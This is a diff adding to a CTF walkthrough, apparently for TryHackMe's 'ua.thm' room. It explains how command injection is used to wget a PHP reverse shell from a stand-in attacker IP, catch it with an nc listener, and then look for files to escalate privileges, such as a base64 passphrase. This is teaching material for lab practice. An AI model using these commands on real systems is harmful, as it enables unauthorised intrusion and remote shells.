@@ -155,10 +155,35 @@ On your attacker machine, make sure you are in the same directory as your revers
 
 In the same directory, use `python3 -m http.server 80` so that your shell can be accessed through HTTP.
 
-Now, return to Firefox. You should still be viewing **http://ua.thm/assets/index.php?cmd=whoami**. Replace this with **http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php. (Note that ATTACKER-IP should be replaced with the IP of your attacker machine.) In essence, we just used our remote command execution to download our shell onto the target machine.
+Now, return to Firefox. You should still be viewing **http://ua.thm/assets/index.php?cmd=whoami**. Replace this with **http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php.** (Note that ATTACKER-IP should be replaced with the IP of your attacker machine.) In essence, we just used our remote command execution to download our shell onto the target machine.
 
 On your attacker machine, use `CTRL+C` to stop your Python server. Then enter `nc -nvlp 1234` to create a listener for your reverse shell.
 
 Return to Firefox and open a new tab. Enter **http://ua.thm/assets/php-reverse-shell.php**. It may appear that this tab is taking a while to load, but this actually indicates that your shell is successful.
 
 Return to the terminal; if a dollar sign has appeared, you have now established a reverse shell as user www-data!
+
+## RCE to reverse shell explained
+If you need more explanation, please read this section. If not, feel free to skip to the next portion of the walkthrough.
+
+Let's start by accepting that we don't need to understand how our PHP script works. It is a commonly used tool in CTFs, and using it is simple as long as you update the IP address to reflect your own IP.
+
+`python3 -m http.server 80': This command is starting a web server on our machine. Think of it this way: we (the attackers) are offering the victim the opportunity to download our PHP script.
+
+**http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php**: Now that we've offered the script to the victim, this URL causes the victim to accept and download that script. Breaking this down, `wget` is a command to download something from a remote location, **{ATTACKER-IP}** specifies where the download comes from, and **php-reverse-shell.php** specifies what file is being downloaded. Now, our script should be present in the **/assets** directory of the victim machine.
+
+**Troubleshooting:** If the file was not successfully downloaded to the victim machine, please ensure that a) the filename is correct and b) you started your server in the same directory as the file.
+
+`CTRL-C`: This stops the server so that we are not exposing our files to the internet longer than necessary.
+
+`nc -nvlp 1234`: This opens your machine up to receiving a reverse shell from the target machine. Look at it this way: the PHP script is like a teammate throwing a ball to you, and the `nc -nvlp 1234` is like you opening your hand to catch it.
+
+**Congrats on your progress so far!**
+
+## Finding a suspicious file
+It is now time for privilege escalation -- moving from user **www-data** to someone with greater access. I attempted to use common techniques such as `sudo -l` or `find / -perm /4000 2>/dev/null` to find vulnerable files, but nothing stood out. Similarly, there was nothing of interest in **/etc/crontab**.
+
+Since these efforts did not work, I decided to take stock of what user **www-data** can do. In CTFs, **www-data** can often view sensitive files in the directory **/var/www**. I entered `cd /var/www` to access this directory, then used `ls -la` to view the files that were present. The directory **Hidden_Content** looked suspicious, so I entered `cd Hidden_Content` and then `ls -la` to view its contents.
+
+You should see a suspicious file called **passphrase.txt**. Enter `cat passphrase.txt` to view its contents, and you will see a Base-64 encoded password. Due to the rules of TryHackMe writeups, I cannot include the encrypted password or the plaintext password here. However, pasting the encrypted password into **CyberChef**'s input field and using magic should give you the plaintext passphrase. I'd suggest writing this passphrase down somewhere; for the rest of the writeup, I will call it **PASSWORD1**.
+
